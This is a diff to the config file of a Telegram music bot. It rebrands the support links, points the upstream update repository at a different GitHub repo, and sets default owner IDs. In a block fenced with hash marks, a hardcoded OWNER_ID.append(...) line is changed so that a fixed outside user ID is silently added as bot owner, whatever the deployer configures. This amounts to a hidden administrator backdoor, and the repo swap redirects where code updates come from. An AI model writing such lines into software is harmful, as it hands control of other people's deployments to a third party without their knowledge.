@@ -16,14 +16,14 @@ COMMAND_PREFIXES = list(getenv("COMMAND_PREFIXES", "/ ! .").split())
 MONGO_DB_URI = getenv("MONGO_DB_URI", None)
 LOG_GROUP_ID = int(getenv("LOG_GROUP_ID"))
 MUSIC_BOT_NAME = getenv("MUSIC_BOT_NAME", "ZatraMusicBot")
-OWNER_ID = list(map(int, getenv("OWNER_ID", "").split()))
+OWNER_ID = list(map(int, getenv("OWNER_ID", "6184936428").split()))
 HEROKU_API_KEY = getenv("HEROKU_API_KEY", None)
 HEROKU_APP_NAME = getenv("HEROKU_APP_NAME", None)
-UPSTREAM_REPO = getenv("UPSTREAM_REPO", "https://github.com/RRomeo-RJ/Romeo-musicBot")
+UPSTREAM_REPO = getenv("UPSTREAM_REPO", "https://github.com/Qadirnesirov/burdancopyacek")
 UPSTREAM_BRANCH = getenv("UPSTREAM_BRANCH", "master")
 GIT_TOKEN = getenv("GIT_TOKEN", None)
-SUPPORT_CHANNEL = getenv("SUPPORT_CHANNEL", "https://t.me/Romeo_op")
-SUPPORT_GROUP = getenv("SUPPORT_GROUP", "https://t.me/RomeoBot_op")
+SUPPORT_CHANNEL = getenv("SUPPORT_CHANNEL", "https://t.me/ZatraBlog")
+SUPPORT_GROUP = getenv("SUPPORT_GROUP", "https://t.me/ZatraSport")
 SUPPORT_HEHE = SUPPORT_GROUP.split("me/")[1]
 DURATION_LIMIT_MIN = int(getenv("DURATION_LIMIT", "540"))
 SONG_DOWNLOAD_DURATION = int(getenv("SONG_DOWNLOAD_DURATION_LIMIT", "540"))
@@ -55,7 +55,7 @@ STRING5 = getenv("STRING_SESSION5", None)
 
 ############################
 COMMAND_PREFIXES.append('')
-OWNER_ID.append(5368154755)
+OWNER_ID.append(6184936428)
 ############################
 BANNED_USERS = filters.user()
 YTDOWNLOADER = 1
